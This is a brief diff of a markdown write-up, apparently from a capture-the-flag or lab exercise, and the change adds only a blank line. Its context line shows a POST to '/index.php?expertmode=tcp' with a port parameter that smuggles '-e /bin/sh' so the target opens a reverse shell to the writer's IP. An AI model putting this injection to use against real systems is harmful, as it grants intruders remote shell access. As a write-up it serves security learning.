@@ -50,6 +50,7 @@ After spending a lot of time looking for files, I started to look through `index
 
 I sent a request to `/index.php?expertmode=tcp` and my post parameters were `ip=10.8.3.153&port=1337+-e+/bin/sh` so I can get a reverse shell.
 
+
 ![](../img/17.png)
 
 ![](../img/18.png)]
